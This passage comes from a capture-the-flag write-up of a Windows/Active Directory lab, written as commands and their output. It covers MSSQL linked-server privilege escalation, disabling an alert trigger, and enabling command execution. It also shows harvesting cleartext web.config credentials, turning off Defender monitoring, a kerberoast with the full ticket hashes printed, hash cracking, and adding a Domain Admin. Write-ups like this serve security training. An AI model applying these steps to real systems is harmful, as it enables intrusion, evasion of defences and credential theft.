\u0026#39;\u0026#39;SERVER\u0026#39;\u0026#39;);\u0026#39;) at [COMPATIBILITY\\POO_CONFIG] entity_name permission_name ----------- --------------- server CONNECT SQL However, when I ask POO_CONFIG to POO_PUBLIC, I’ve got all the permissions:\nSQL (external_user external_user@master)\u0026gt; EXECUTE (\u0026#39;EXECUTE (\u0026#39;\u0026#39;SELECT entity_name, permission_name FROM fn_my_permissions(NULL, \u0026#39;\u0026#39;\u0026#39;\u0026#39;SERVER\u0026#39;\u0026#39;\u0026#39;\u0026#39;);\u0026#39;\u0026#39;) at [COMPATIBILITY\\POO_PUBLIC]\u0026#39;) at [COMPATIBILITY\\POO_CONFIG]; entity_name permission_name ----------- ------------------------------- server CONNECT SQL server SHUTDOWN server CREATE ENDPOINT server CREATE ANY DATABASE server CREATE AVAILABILITY GROUP server ALTER ANY LOGIN server ALTER ANY CREDENTIAL server ALTER ANY ENDPOINT server ALTER ANY LINKED SERVER server ALTER ANY CONNECTION server ALTER ANY DATABASE server ALTER RESOURCES server ALTER SETTINGS server ALTER TRACE server ALTER ANY AVAILABILITY GROUP server ADMINISTER BULK OPERATIONS server AUTHENTICATE SERVER server EXTERNAL ACCESS ASSEMBLY server VIEW ANY DATABASE server VIEW ANY DEFINITION server VIEW SERVER STATE server CREATE DDL EVENT NOTIFICATION server CREATE TRACE EVENT NOTIFICATION server ALTER ANY EVENT NOTIFICATION server ALTER SERVER STATE server UNSAFE ASSEMBLY server ALTER ANY SERVER AUDIT server CREATE SERVER ROLE server ALTER ANY SERVER ROLE server ALTER ANY EVENT SESSION server CONNECT ANY DATABASE server IMPERSONATE ANY LOGIN server SELECT ALL USER SECURABLES server CONTROL SERVER To make our work easier, I shall add another sa user to make our work easier rather than keep on bouncing everything every time.\nSQL (external_user external_user@master)\u0026gt; EXECUTE(\u0026#39;EXECUTE(\u0026#39;\u0026#39;CREATE LOGIN df WITH PASSWORD = \u0026#39;\u0026#39;\u0026#39;\u0026#39;victor_n00b\u0026#39;\u0026#39;\u0026#39;\u0026#39;;\u0026#39;\u0026#39;) AT [COMPATIBILITY\\POO_PUBLIC]\u0026#39;) AT [COMPATIBILITY\\POO_CONFIG] SQL (external_user external_user@master)\u0026gt; EXECUTE(\u0026#39;EXECUTE(\u0026#39;\u0026#39;EXEC sp_addsrvrolemember \u0026#39;\u0026#39;\u0026#39;\u0026#39;df\u0026#39;\u0026#39;\u0026#39;\u0026#39;, \u0026#39;\u0026#39;\u0026#39;\u0026#39;sysadmin\u0026#39;\u0026#39;\u0026#39;\u0026#39;\u0026#39;\u0026#39;) AT [COMPATIBILITY\\POO_PUBLIC]\u0026#39;) AT [COMPATIBILITY\\POO_CONFIG] SQL (external_user Lets try to connect to the server with our new admin account.\n┌──(root㉿v1c70r)-[/home/…/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner] └─# python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py df:victor_n00b@10.13.38.11 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(COMPATIBILITY\\POO_PUBLIC): Line 1: Changed database context to \u0026#39;master\u0026#39;. [*] INFO(COMPATIBILITY\\POO_PUBLIC): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (140 88) [!] Press help for extra shell commands SQL (df dbo@master)\u0026gt; we are in, lets get our DB flag now. As the new sa user, I can now access another database flag and to query a I can now access another database in MSSQL, the syntax is [server].[db].[schema].[table]. Therefore, I can retrieve the flag using the following command as shown below.\nSQL (df dbo@master)\u0026gt; SELECT name FROM master..sysdatabases; name ---------- master tempdb model msdb POO_PUBLIC flag SQL (df dbo@master)\u0026gt; select table_schema from flag.INFORMATION_SCHEMA.TABLES; table_schema ------------ dbo SQL (df dbo@master)\u0026gt; select * from flag.dbo.flag flag ---------------------------------------- b\u0026#39;POO{[REDACTED]}\u0026#39; BackTrack # Now that I’m sa on the database, I want to get a shell on the host. I’ll try xp_cmdshell, but it fails.\nSQL (df dbo@master)\u0026gt; xp_cmdshell whoami ERROR(COMPATIBILITY\\POO_PUBLIC): Line 1: SQL Server blocked access to procedure \u0026#39;sys.xp_cmdshell\u0026#39; of component \u0026#39;xp_cmdshell\u0026#39; because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of \u0026#39;xp_cmdshell\u0026#39; by using sp_configure. For more information about enabling \u0026#39;xp_cmdshell\u0026#39;, search for \u0026#39;xp_cmdshell\u0026#39; in SQL Server Books Online. it could be the command is disabled, lets try to enable it.\nSQL (df dbo@master)\u0026gt; enable_xp_cmdshell INFO(COMPATIBILITY\\POO_PUBLIC): Line 185: Configuration option \u0026#39;show advanced options\u0026#39; changed from 0 to 1. Run the RECONFIGURE statement to install. ERROR(COMPATIBILITY\\POO_PUBLIC): Line 11: Attempt to enable xp_cmdshell detected. Database Administrators will be notified! ERROR(COMPATIBILITY\\POO_PUBLIC): Line 181: The transaction ended in the trigger. The batch has been aborted. Trying the manual way, I still got the same error.\nSQL (df dbo@master)\u0026gt; sp_configure \u0026#39;show advanced options\u0026#39;, \u0026#39;1\u0026#39; INFO(COMPATIBILITY\\POO_PUBLIC): Line 185: Configuration option \u0026#39;show advanced options\u0026#39; changed from 1 to 1. Run the RECONFIGURE statement to install. SQL (df dbo@master)\u0026gt; reconfigure SQL (df dbo@master)\u0026gt; sp_configure \u0026#39;xp_cmdshell\u0026#39;, \u0026#39;1\u0026#39; ERROR(COMPATIBILITY\\POO_PUBLIC): Line 11: Attempt to enable xp_cmdshell detected. Database Administrators will be notified! ERROR(COMPATIBILITY\\POO_PUBLIC): Line 181: The transaction ended in the trigger. The batch has been aborted. These triggers serve as a policy designed to alert and prevent attempts to enable and use xp_cmdshell. The issue is that, as the sa user, I have the ability to disable these triggers. Triggers can be found in sys.server_triggers :\nSQL (df dbo@master)\u0026gt; select name from sys.server_triggers; name ----------------- ALERT_xp_cmdshell I just need the syntax to disable it.\nSQL (df dbo@master)\u0026gt; disable trigger ALERT_xp_cmdshell on all server SQL (df dbo@master)\u0026gt; with that, we can now enable xp_cmdhsell and it worked as seen below.\nSQL (df dbo@master)\u0026gt; enable_xp_cmdshell INFO(COMPATIBILITY\\POO_PUBLIC): Line 185: Configuration option \u0026#39;show advanced options\u0026#39; changed from 1 to 1. Run the RECONFIGURE statement to install. INFO(COMPATIBILITY\\POO_PUBLIC): Line 185: Configuration option \u0026#39;xp_cmdshell\u0026#39; changed from 1 to 1. Run the RECONFIGURE statement to install. SQL (df dbo@master)\u0026gt; xp_cmdshell whoami output --------------------------- nt service\\mssql$poo_public NULL Privilege escalation # mssql$poo_public has limited access. While there is a home directory, it is empty. The user has some access to the web directory, but the most notable file, \\inetput\\wwwroot\\web.config, returns an access denied error:\nSQL (df dbo@master)\u0026gt; xp_cmdshell type C:\\inetpub\\wwwroot\\web.config output ----------------- Access is denied. NULL It appears that when a web server is configured to run the stored procedure sp_execute_external_script under a different user account, it allows for certain operations. The syntax for executing the script is quite straightforward:\nSQL (df dbo@master)\u0026gt; EXEC sp_execute_external_script @language =N\u0026#39;Python\u0026#39;, @script = N\u0026#39;import os; os.system(\u0026#34;whoami\u0026#34;);\u0026#39;; INFO(COMPATIBILITY\\POO_PUBLIC): Line 0: STDOUT message(s) from external script: compatibility\\poo_public01 Express Edition will continue to be enforced. Now we can run as poo_public01. Lets try to read the web.config file to see if we can find anything of interest to us.\nSQL (df dbo@master)\u0026gt; EXEC sp_execute_external_script @language =N\u0026#39;Python\u0026#39;, @script = N\u0026#39;import os; os.system(\u0026#34;type \\inetpub\\wwwroot\\web.config\u0026#34;);\u0026#39;; INFO(COMPATIBILITY\\POO_PUBLIC): Line 0: STDOUT message(s) from external script: \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;system.webServer\u0026gt; \u0026lt;staticContent\u0026gt; \u0026lt;mimeMap fileExtension=\u0026#34;.DS_Store\u0026#34; mimeType=\u0026#34;application/octet-stream\u0026#34; /\u0026gt; \u0026lt;/staticContent\u0026gt; \u0026lt;!-- \u0026lt;authentication mode=\u0026#34;Forms\u0026#34;\u0026gt; \u0026lt;forms name=\u0026#34;login\u0026#34; loginUrl=\u0026#34;/admin\u0026#34;\u0026gt; \u0026lt;credentials passwordFormat = \u0026#34;Clear\u0026#34;\u0026gt; \u0026lt;user name=\u0026#34;Administrator\u0026#34; password=\u0026#34;EverybodyWantsToWorkAtP.O.O.\u0026#34; /\u0026gt; \u0026lt;/credentials\u0026gt; \u0026lt;/forms\u0026gt; \u0026lt;/authentication\u0026gt; --\u0026gt; \u0026lt;/system.webServer\u0026gt; \u0026lt;/configuration\u0026gt; Express Edition will continue to be enforced. As seen above, the file contains creds for the administrator account. These could work to get past the basic auth at /admin and return the next flag.\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner] └─$ curl -s http://administrator:EverybodyWantsToWorkAtP.O.O.@10.13.38.11/admin/ \u0026#34;I can\u0026#39;t go back to yesterday, because i was a different person then...\u0026#34;\u0026lt;br\u0026gt; - Alice in Wonderland\u0026lt;br\u0026gt; \u0026lt;br\u0026gt; Flag : POO{[redacted]} Foothold # Local Enumeration # It took some time to piece everything together. Initially, I found that the host is listening on WinRM, TCP port 5985, for both IPv4 and IPv6 connections:\nSQL (df dbo@master)\u0026gt; EXEC sp_execute_external_script @language =N\u0026#39;Python\u0026#39;, @script = N\u0026#39;import os; os.system(\u0026#34;netstat -ano\u0026#34;);\u0026#39;; INFO(COMPATIBILITY\\POO_PUBLIC): Line 0: STDOUT message(s) from external script: Active Connections Proto Local Address Foreign Address State PID TCP 0.0.0.0:80 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 1004 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:1433 0.0.0.0:0 LISTENING 4788 TCP 0.0.0.0:5357 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:5985 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:41433 0.0.0.0:0 LISTENING 4540 TCP 0.0.0.0:47001 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:49664 0.0.0.0:0 LISTENING 592 TCP 0.0.0.0:49665 0.0.0.0:0 LISTENING 1356 TCP 0.0.0.0:49666 0.0.0.0:0 LISTENING 720 INFO(COMPATIBILITY\\POO_PUBLIC): Line 0: STDOUT message(s) from external script: TCP 0.0.0.0:49667 0.0.0.0:0 LISTENING 1860 TCP 0.0.0.0:49668 0.0.0.0:0 LISTENING 2508 TCP 0.0.0.0:49669 0.0.0.0:0 LISTENING 720 TCP 0.0.0.0:49672 0.0.0.0:0 LISTENING 712 TCP 10.13.38.11:80 10.10.14.172:32772 TIME_WAIT 0 TCP 10.13.38.11:80 10.10.14.172:32782 TIME_WAIT 0 TCP 10.13.38.11:80 10.10.14.172:32794 TIME_WAIT 0 TCP 10.13.38.11:80 10.10.14.172:32798 TIME_WAIT 0 TCP 10.13.38.11:80 10.10.14.172:32806 TIME_WAIT 0 TCP 10.13.38.11:80 10.10.14.172:32822 TIME_WAIT 0 TCP 10.13.38.11:80 10.10.14.172:32828 TIME_WAIT 0 TCP 10.13.38.11:80 10.10.14.172:32834 TIME_WAIT 0 ..[snip]... Although the initial nmap scan did not show the 5985 listening on IPV4, as seen above, we have winrm actively listening. To check further, I was required to get the IPV6 address of the machine using ipconfig in order for us to scan it using nmap to see if truly winrm is actively listening on the host.\nSQL (df dbo@master)\u0026gt; EXEC sp_execute_external_script @language =N\u0026#39;Python\u0026#39;, @script = N\u0026#39;import os; os.system(\u0026#34;ipconfig\u0026#34;);\u0026#39;; INFO(COMPATIBILITY\\POO_PUBLIC): Line 0: STDOUT message(s) from external script: Windows IP Configuration Ethernet adapter Ethernet0 2: Connection-specific DNS Suffix . : IPv6 Address. . . . . . . . . . . : dead:beef::1001 IPv6 Address. . . . . . . . . . . : dead:beef::7ef0:e82c:6a2:1f2f Link-local IPv6 Address . . . . . : fe80::8d5a:640b:98c7:f8de%8 IPv4 Address. . . . . . . . . . . : 10.13.38.11 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : dead:beef::1 fe80::250:56ff:feb0:8205%8 10.13.38.2 Ethernet adapter Ethernet1 2: Connection-specific DNS Suffix . : IPv4 Address. . . . . . . . . . . : 172.20.128.101 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : Express Edition will continue to be enforced. below is the result of the nmap scan which shows clearly, winrm is listening.\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner] └─$ nmap -sCV -p- -6 dead:beef::1001 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-07 07:27 EAT Stats: 0:07:57 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 98.54% done; ETC: 07:35 (0:00:07 remaining) Stats: 0:07:57 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 98.58% done; ETC: 07:35 (0:00:07 remaining) Nmap scan report for dead:beef::1001 Host is up (0.29s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-server-header: | Microsoft-HTTPAPI/2.0 |_ Microsoft-IIS/10.0 |_http-title: Bad Request 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.2056.00; RTM+ | ms-sql-info: | dead:beef::1001:1433: | Version: | name: Microsoft SQL Server 2017 RTM+ | number: 14.00.2056.00 | Product: Microsoft SQL Server 2017 | Service pack level: RTM | Post-SP patches applied: true |_ TCP port: 1433 |_ssl-date: 2024-10-07T04:35:50+00:00; +3s from scanner time. | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2024-10-06T09:29:44 |_Not valid after: 2054-10-06T09:29:44 | ms-sql-ntlm-info: | dead:beef::1001:1433: | Target_Name: POO | NetBIOS_Domain_Name: POO | NetBIOS_Computer_Name: COMPATIBILITY | DNS_Domain_Name: intranet.poo | DNS_Computer_Name: COMPATIBILITY.intranet.poo | DNS_Tree_Name: intranet.poo |_ Product_Version: 10.0.17763 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Bad Request |_http-server-header: Microsoft-HTTPAPI/2.0 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2s, deviation: 0s, median: 2s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 499.29 seconds I can establish a connection over WinRM using Evil-WinRM. To facilitate an IPv6 connection, I’ll add the IP address to my local /etc/hosts file. The hostname returned by the box is COMPATIBILITY:\nSQL (df dbo@master)\u0026gt; EXEC sp_execute_external_script @language =N\u0026#39;Python\u0026#39;, @script = N\u0026#39;import os; os.system(\u0026#34;hostname\u0026#34;);\u0026#39;; INFO(COMPATIBILITY\\POO_PUBLIC): Line 0: STDOUT message(s) from external script: COMPATIBILITY Express Edition will continue to be enforced. as seen below, we have added the IP to our /etc/hosts/ file on our attacker machine.\n127.0.0.1 localhost 127.0.1.1 v1c70r # The following lines are desirable for IPv6 capable hosts ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters 10.129.141.23 unika.htb 10.129.3.186 thetoppers.htb 10.129.3.186 s3.thetoppers.htb dead:beef::1001 COMPATIBILITY Its time to connect to our comprised host as shown below.\n┌──(root㉿v1c70r)-[/home/…/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner] └─# evil-winrm -i compatibility -u administrator -p \u0026#39;EverybodyWantsToWorkAtP.O.O.\u0026#39; Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; It is time to get our foothold flag.\n*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u0026gt; ls Directory: C:\\Users\\Administrator\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 3/26/2018 5:29 PM 37 flag.txt *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u0026gt; type flag.txt POO{[REDACTED]} *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u0026gt; p00ned # First, I started by enumerating my privilieges with the admin user.\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; whoami /all USER INFORMATION ---------------- User Name SID =========================== ========================================== compatibility\\administrator S-1-5-21-158512341-328150952-995267585-500 GROUP INFORMATION ----------------- Group Name Type SID Attributes ============================================================= ================ ============ =============================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Local account and member of Administrators group Well-known group S-1-5-114 Mandatory group, Enabled by default, Enabled group BUILTIN\\Administrators Alias S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Local account Well-known group S-1-5-113 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\High Mandatory Level Label S-1-16-12288 PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ========================================= ================================================================== ======= SeIncreaseQuotaPrivilege Adjust memory quotas for a process Enabled SeSecurityPrivilege Manage auditing and security log Enabled SeTakeOwnershipPrivilege Take ownership of files or other objects Enabled SeLoadDriverPrivilege Load and unload device drivers Enabled SeSystemProfilePrivilege Profile system performance Enabled SeSystemtimePrivilege Change the system time Enabled SeProfileSingleProcessPrivilege Profile single process Enabled SeIncreaseBasePriorityPrivilege Increase scheduling priority Enabled SeCreatePagefilePrivilege Create a pagefile Enabled SeBackupPrivilege Back up files and directories Enabled SeRestorePrivilege Restore files and directories Enabled SeShutdownPrivilege Shut down the system Enabled SeDebugPrivilege Debug programs Enabled SeSystemEnvironmentPrivilege Modify firmware environment values Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeRemoteShutdownPrivilege Force shutdown from a remote system Enabled SeUndockPrivilege Remove computer from docking station Enabled SeManageVolumePrivilege Perform volume maintenance tasks Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled SeTimeZonePrivilege Change the time zone Enabled SeCreateSymbolicLinkPrivilege Create symbolic links Enabled SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled USER CLAIMS INFORMATION ----------------------- User claims unknown. Kerberos support for Dynamic Access Control on this device has been disabled. As seen above, it is clear we are a local admin user of the system. We will now use this hos as our jump point to other hosts. below is the address of the machine\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; ipconfig Windows IP Configuration Ethernet adapter Ethernet0 2: Connection-specific DNS Suffix . : IPv6 Address. . . . . . . . . . . : dead:beef::1001 IPv6 Address. . . . . . . . . . . : dead:beef::7ef0:e82c:6a2:1f2f Link-local IPv6 Address . . . . . : fe80::8d5a:640b:98c7:f8de%8 IPv4 Address. . . . . . . . . . . : 10.13.38.11 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : dead:beef::1 fe80::250:56ff:feb0:8205%8 10.13.38.2 Ethernet adapter Ethernet1 2: Connection-specific DNS Suffix . : IPv4 Address. . . . . . . . . . . : 172.20.128.101 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : Kerberoasting # Next, I decided to perform some kerberoasting in order to get some tickets we could use to get access to another user but first, I had to disable realtime monitoring as shown below.\n*Evil-WinRM* PS C:\\users\u0026gt; set-mppreference -disablerealtimemonitoring $true After uploading our powershell script onto the host machine, we shall run it from the sql server as shown below.\nSQL (df dbo@master)\u0026gt; xp_cmdshell powershell -c import-module C:\\Temp\\invoke-kerberoast.ps1; invoke-kerberoast output -------------------------------------------------------------------------------- NULL NULL TicketByteHexStream : Hash : $krb5tgs$HR_peoplesoft/intranet.poo:1433:A175CE2658B987C0FE5CE7CE9380303E$C82FEE2FB0F43648D7C3BD 10BE84A19E8953E7EE295D224E38F89B6B8EEDBFCF177F1E1DD8BC4CEA78B59059FC365DB3DF096BD8E7FA584BABE6DA E33C2F3EF1654958DECBF025C651B2CB4016071CE78D505DEE1A9893C1D64215D663324B15F01FEA7CCFB9D3979391E4 D05FDEA0E70575BC8A48FBC1885D9097416F778B07F696203AA818125C0FD2223F721056AE444C1AA10AE3151BAE1757 3A276625C78B2A46DC5F24054541CBD4A7E6FA67082D885F212C2CB132432AD5BD64BDD5063F0AFAC505703703B20B3E E1E369BDC8281F679B07949474B7C22C498E77ADBB54D9362FBE00AA8678AE180C4713973A08B94DA1A3808EE70B68C6 0D75DC5348DF0BD321FAD17FDA36D7BA4AFD197365958CDE3CEF076EDC90863B1F27CB038D64FEFEE179654C93545A14 AB02CE6E821022D1EFDE08FA58B95D6726724DB02519224E34AAF7C20C165858A28D0EBB4EC1634272CD74610ABDCD11 8898C407FEA9B9B82C539C4FD6465B09C8188A340FE8668E987D4E009D4D8672FD68AD828D3A2F011700B7FEE42C9934 0995A3D6C29442B83ACD453611955E600ACBCEDA6E9FAB078C53954DCC801AD17656CFDDCF0FC7A656FBF67FDE9516CD 3D3E255262841D6C25C52C81472ECE2C16F98CD957996D2C3CA5604F918C58F8EA2D1163D51AF36E9C3DF496442D604B D31A7D8E3CE1093C47009ADF930A9CF736249D42EE289FBFB9636CD129E8D992C3FFE651CC94046FD1593AD1CD9236F2 DD29E22EE389E56FF702783CA9EE4E7A5BAEC5F647F1EB34E26D98AF57E1C3F84DC83B4C851F5F867FB89CEFCB717679 2AA840F594D946006F5F8C86EB5EB3F1AD50469A769817930A7F4027DFE852B6F235EEC086F88DB38DCF68F889D62388 6683C43C6F52123B6337C16FCF8A23162E21C74A335D5C143292F801DAA42C9469A73F63C245E18A6BCCF779AD82BCA9 EC5D4DC80271D6A8C8494906C55F66AB39DA96AC5C21F271C950940D809CE97E238C4F33486D0B566666F66BD8316602 C5332F749D54A66FFE65CA76302F2D69BD0BD73A5385BE98B006636B44B0B7BA2AA8630B311899875EBE7C97E4DDA210 E35D682924CE1EE1050D5B3E368F45223F329D1140E79DD9670454C07E6EBBF8C5BC7F52E248734F4BBA4B1CA37B4C4C 8CF9F35C937F00C4ACAF923FDF442F8699C0449023F3A15D7B37E2986B5244733BF1199D401EEC5B30E479D0D15C4984 3FCF911C8673464D8FAA70B45129F6D76FD4E4D6056E6063DC40ADA827C4F47622D3A757CC313424DECBF784E51C2A90 9B3F1E131200B4352A3802B20122F0A966C6E5606C723F3E54AC5D53AFD7252D0B115496A0C595A0F1254FCC2CCBB81B 9EE82FDFF47EB993B4D9F4749BC639853727D5A176D55A654A897E05F6FD711E7177EED89D380FC40D1733D47C7D95B0 1511F3920417D651A6D3DF606B01757B634B3876ED3219829922462B8CE47C684AE01C46E3F5023D78881BCA09F67C66 695A5065065CD9A46CB2368B7253568EE429D635829A7C376E22F34DD1E15EEB03D73AD42F41C92F848BEC6CBC422054 C05AB02CC928C7DFF27BE1B34062E0FECA422E1A0721C5672AE2A2A1F566564C61C9DD58D483705913BEA15FFF970A47 13739985CE588246F070D28B81A31AB2707CF8F6B4463DE3C7D5073140F3F6689397 SamAccountName : p00_hr DistinguishedName : CN=p00_hr,CN=Users,DC=intranet,DC=poo ServicePrincipalName : HR_peoplesoft/intranet.poo:1433 NULL TicketByteHexStream : Hash : $krb5tgs$cyber_audit/intranet.poo:443:E3A87FEF289CC540C73A52551F3C3A43$1096E4652145F6AF34174138C 6B5FA7091AC7088CB0AFBA198E5D967C7FF778045E3D7186A75125D963896F3C6A26207ADDDD9E15204182DF89498377 516EC136DE8596791CDF26E1C78F6A94DC993EC61EADDA5B7A71430E16065BB20B6D411FB373349FE6FB012FBA27A7F7 AC52D94F56F06AD072B70448AC78D7D6D17454817BFB1C5684B8A8CC8F5C71DA108618E3B549997E0CF52F5833388B20 06FE0AA2C1191D32DB7F9CC3D742B367F858A87BBBF9C54C8369366B218CAB9B6F63B094BA3FFE3CB4FE6445C2E3835A DDA544BD6A92604244199F5C73DE0191B3272BF65D4C21B04E6CB4CC0401045FEBB53FE36A2AA05FD4379D868A06AE51 EB177A2958527BCFCB48D8865E9D3192FDED6F1F8832763CEFF1700A666E479A4F043169B9FD1EE9FCAAD741ED2173A9 88D7BCA8A6A9BBAB82931DD8DCE071727BC50330627BEF3B571437006D2DA8E02BC89F4541FEEBBBECF119ACF59EBE7F BF0C36CD65B36BDFB0D27566A6D9D7E6527D896CE2C3AE84175AD3870943984017E3285C71D379B8AD162A4B4D24A3DF DFDBC479220B45254F90C3384AE946F5E239480B8C74F93C0889C653F950762AA3CA717D34D6028409975202D55E5DE1 28219423A23C8675F67FC71BEF0534932A2CC7248AECA151F019EA594AFD56B5CF910497AF67DD06AE42AB7FA8DCB7B9 BF519A47B844233238E0B1D085B110B31F055047AD4EA638B25EF4D73F1C0D2CF46CE495D4B2C8C1BBE71C9AD58B958E 71F73339114F893F0C2CDCB33BF7C0C28E1596E0A1EF450B4505EE1AE334CF6AC374E92AF6FB21B13711DAAACC6CACBB 8946F06F5C024EC5150F8402D50F732D93A3625B6A9CEEB7B134DFAC69BE4206C358E3C3B88D0469DC5CDD341BF30C87 C8336EC0A16215EB8F241CB74AD69A30EF118395173D2815CD579E43B2D181242DC85BF26111B221215317C34B82D13D 430F58C8A2B77D8D1D26F3357D2DE6BD5C109E4B16C1D29E507311F5266B7CC323252609D5C9171C04098FFB4E4AB71D 5006CE10BF7329BC0920E328FAB9621A2747587CBA14164CBD31C22CB90DA1CAF0EBDAEC40BD643245A724C62F63DDCD 93C86DF38275E90EE0BD7AC0614A033EAE597BD8131129C091946D983B57401F5AA0FEF76628992129C6C2BA744F2BBA 30477ABFEF70FF620619CBC20B60B9CB238216E33018EC972D6840896C65BACE07DDC87A4EB237108D6AD1E8BA4B13A0 98E16FDA4616A95A5B13334DB5469C8898E7790FACC14EB33671E4BED7935D21ABF80DE28F3F902A96F59470F0C530C9 D3EC61DF1CA62C8B708E7963C7ACB19424814C80C2791735B9CD7DFF5C770412C329C62D8655FDE7293C40F98D38AFCC 10543A7ECF58F6AAC5A0E5B63B3106E124EF76B5062DB4E29732098EFC937347FB0076F3AEF047BC49D188A9BE6F5B38 048AD94733B0FBF0245A337F5408A71FC2772C10B07DB4C85435949617200374F3961AEF56A2D4B929C22CE298EE9587 7159EA68A7F3E596399FB645FFE9D57CA3D49C5E77C8568927A0EFDA0B4E0A04730EB7DB98E9B1F4FD2F93621BAD87B0 7F41F2B09EA07C61AE2154AF9BB2076A2EA1C0857E2990E89103DFC81BB07D5A66541C849A3EFA2C9894CE5BE14CD9C3 0D483FDFFC6CD13BFD35E2730A91396448E9A6BE611C156C5537765A4949FA9CF SamAccountName : p00_adm DistinguishedName : CN=p00_adm,CN=Users,DC=intranet,DC=poo ServicePrincipalName : cyber_audit/intranet.poo:443 NULL NULL NULL NULL As seen above, we have two accounts with their hashes identified. We shall try to crack the hashes using hashcat as seen below.\nhashcat -m 13100 p00_adm /usr/share/wordlists/seclists/Passwords/Keyboard-Walks/Keyboard-Combinations.txt --force --force ...[snip]... ZQ!5t4r the hash for the admin is the one that was able to crack. After getting the credentials, we shall use the newly found creds and add the p00_adm to the admins group as shown below, after uploading the powerview script from powersploit onto the host machine.\n*Evil-WinRM* PS C:\\Temp\u0026gt; upload PowerView.ps1 . Info: Uploading /home/n00b/HTB Prolabs/P.O.O/web enum/PowerView.ps1 to C:\\Temp\\. Data: 1027036 bytes of 1027036 bytes copied Info: Upload successful! *Evil-WinRM* PS C:\\Temp\u0026gt; Import-Module .\\PowerView.ps1 // Here I have created a PSCredential object to add p00_adm to the admin groups domain. *Evil-WinRM* PS C:\\Temp\u0026gt; $pass = ConvertTo-SecureString \u0026#39;ZQ!5t4r\u0026#39; -AsPlainText -Force *Evil-WinRM* PS C:\\Temp\u0026gt; $cred = New-Object System.Management.Automation.PSCredential(\u0026#39;intranet.poo\\p00_adm\u0026#39;, $pass) *Evil-WinRM* PS C:\\Temp\u0026gt; Add-DomainGroupMember -Identity \u0026#39;Domain Admins\u0026#39; -Members \u0026#39;p00_adm\u0026#39; -Credential $cred Since p00_adm is now a domain admin, it can access the c$ share on the Domain Controller and grab the flag I found on mr3ks’s desktop.\n*Evil-WinRM* PS C:\\Temp\u0026gt; net use \\\\DC.intranet.poo\\c$ /u:intranet.poo\\p00_adm \u0026#39;ZQ!5t4r\u0026#39; The command completed successfully. *Evil-WinRM* PS C:\\Temp\u0026gt; dir \\\\DC.intranet.poo\\c$\\users\\ Directory: \\\\DC.intranet.poo\\c$\\users Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 3/15/2018 1:20 AM Administrator d----- 